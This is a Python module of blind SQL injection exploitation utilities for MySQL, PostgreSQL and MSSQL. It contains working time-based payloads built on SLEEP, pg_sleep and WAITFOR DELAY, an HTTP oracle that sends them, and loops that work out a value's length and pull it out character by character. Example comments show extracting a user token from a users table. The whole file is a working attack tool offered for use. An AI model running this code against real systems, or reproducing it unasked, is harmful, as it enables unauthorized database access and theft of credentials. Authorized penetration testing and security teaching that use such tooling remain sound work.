"""
sqli_utils.py - Common SQL Injection helper utilities

This module provides timing-based and content-based inference primitives,
condition builders, extraction loops, and charset utilities
suitable for blind SQL injection exploitation.

Supports MySQL, PostgreSQL, and MSSQL-style injections.
"""

import time
import requests
from typing import Callable, Literal, Optional

# Default printable ASCII charset
DEFAULT_CHARSET = "".join(chr(i) for i in range(32, 127))


def time_based_oracle(
    url: str,
    param: str,
    injection: str,
    method: Literal["GET", "POST"] = "GET",
    delay: int = 3,
    proxies: Optional[dict] = None,
) -> bool:
    """
    Sends a timing-based SQLi payload and checks if response delay exceeds threshold.
    """
    start = time.time()

    if method == "GET":
        response = requests.get(
            url, params={param: injection}, proxies=proxies, timeout=delay + 2
        )
    else:
        response = requests.post(
            url, data={param: injection}, proxies=proxies, timeout=delay + 2
        )

    elapsed = time.time() - start
    return elapsed >= delay


def build_ascii_condition(
    expr: str, pos: int, char: str, dbms: Literal["mysql", "postgres", "mssql"]
) -> str:
    ord_val = ord(char)

    if dbms == "mysql":
        return f"1 AND IF(ASCII(SUBSTRING(({expr}),{pos},1))={ord_val},SLEEP(3),0)--"
    elif dbms == "postgres":
        return f"1 AND CASE WHEN ASCII(SUBSTRING(({expr}) FROM {pos} FOR 1))={ord_val} THEN pg_sleep(3) ELSE pg_sleep(0) END--"
    elif dbms == "mssql":
        return f"1; IF(ASCII(SUBSTRING(({expr}),{pos},1))={ord_val}) WAITFOR DELAY '0:0:3'--"
    else:
        raise ValueError("Unsupported DBMS")


def extract_string(
    expr: str,
    length: int,
    oracle_fn: Callable[[str], bool],
    charset: str = DEFAULT_CHARSET,
    dbms: Literal["mysql", "postgres", "mssql"] = "mysql",
) -> str:
    """
    Extracts a string character by character using a timing-based oracle.
    """
    result = ""
    for pos in range(1, length + 1):
        for c in charset:
            condition = build_ascii_condition(expr, pos, c, dbms)
            if oracle_fn(condition):
                result += c
                print(f"[+] Char at {pos}: {c}")
                break
        else:
            result += "?"
            print(f"[-] Char at {pos}: not found")
    return result


def find_length(
    expr: str,
    oracle_fn: Callable[[str], bool],
    max_length: int = 100,
    dbms: Literal["mysql", "postgres", "mssql"] = "mysql",
) -> int:
    for length in range(1, max_length + 1):
        if dbms == "mysql":
            condition = f"1 AND IF(LENGTH(({expr}))={length},SLEEP(3),0)--"
        elif dbms == "postgres":
            condition = f"1 AND CASE WHEN LENGTH(({expr}))={length} THEN pg_sleep(3) ELSE pg_sleep(0) END--"
        elif dbms == "mssql":
            condition = f"1; IF(LEN(({expr}))={length}) WAITFOR DELAY '0:0:3'--"
        else:
            raise ValueError("Unsupported DBMS")

        if oracle_fn(condition):
            print(f"[+] Found length: {length}")
            return length
    return 0


# Example usage patterns (caller side):
#
# 1. Define a lambda-based oracle:
#    oracle_fn = lambda cond: time_based_oracle(url, "search", cond, method="GET", delay=3, proxies=burp)
#
# 2. Get length of a token:
#    length = find_length("SELECT token FROM users WHERE id=1", oracle_fn, dbms="mysql")
#
# 3. Extract token value:
#    token = extract_string("SELECT token FROM users WHERE id=1", length, oracle_fn, dbms="mysql")
